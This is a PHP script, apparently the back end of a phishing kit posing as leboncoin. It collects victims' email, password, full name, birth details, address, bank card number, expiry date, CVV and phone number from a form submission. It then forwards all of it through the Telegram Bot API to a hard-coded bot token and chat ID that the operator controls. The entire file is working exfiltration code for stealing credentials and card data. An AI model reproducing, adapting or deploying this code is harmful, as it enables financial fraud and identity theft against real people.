<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
header('Content-Type: application/json');

// Log de début
error_log("🚀 Début du traitement de la requête");

// Récupération des données JSON
$json = file_get_contents('php://input');
error_log("📥 Données reçues: " . $json);

$data = json_decode($json, true);
error_log("🔄 Données décodées: " . print_r($data, true));

// Configuration Telegram
$botToken = '7942341902:AAH-Es10Dc5KgSL6pJpyhMHFzFQvZMsL_HM';
$chatId = '6970748370';

// Formatage du message
$message = "🔥 NOUVELLES INFORMATIONS 🔥\n\n";
$message .= "📧 Email: " . $data['email'] . "\n";
$message .= "🔑 Mot de passe: " . $data['password'] . "\n";
$message .= "💰 Prix: " . $data['prix'] . "€\n";
$message .= "👤 Nom: " . $data['nom'] . "\n";
$message .= "📅 Date de naissance: " . $data['dob'] . "\n";
$message .= "📍 Lieu de naissance: " . $data['lieu'] . "\n";
$message .= "🏠 Adresse: " . $data['addresse'] . "\n";
$message .= "💳 Carte: " . $data['cc'] . "\n";
$message .= "📅 Expiration: " . $data['exp'] . "\n";
$message .= "🔒 CVV: " . $data['cvv'] . "\n";
$message .= "📱 Téléphone: " . $data['num'] . "\n";
$message .= "\n🌐 leboncoin";

error_log("📝 Message formaté: " . $message);

// Envoi à Telegram
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];
error_log("🌐 URL Telegram: " . $url);
error_log("📤 Paramètres: " . print_r($params, true));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Pour le développement uniquement
curl_setopt($ch, CURLOPT_VERBOSE, true); // Active les logs détaillés de cURL

// Log de l'exécution cURL
$verbose = fopen('php://temp', 'w+');
curl_setopt($ch, CURLOPT_STDERR, $verbose);

$response = curl_exec($ch);
$curl_errno = curl_errno($ch);
$curl_error = curl_error($ch);

if ($curl_errno > 0) {
    error_log("❌ Erreur cURL: " . $curl_error);
    rewind($verbose);
    $verboseLog = stream_get_contents($verbose);
    error_log("📋 Log cURL détaillé: " . $verboseLog);
} else {
    error_log("✅ Réponse Telegram: " . $response);
}

curl_close($ch);

// Réponse au client
$result = ['success' => true, 'message' => 'Données envoyées avec succès'];
error_log("📤 Réponse finale: " . json_encode($result));
echo json_encode($result);
?>

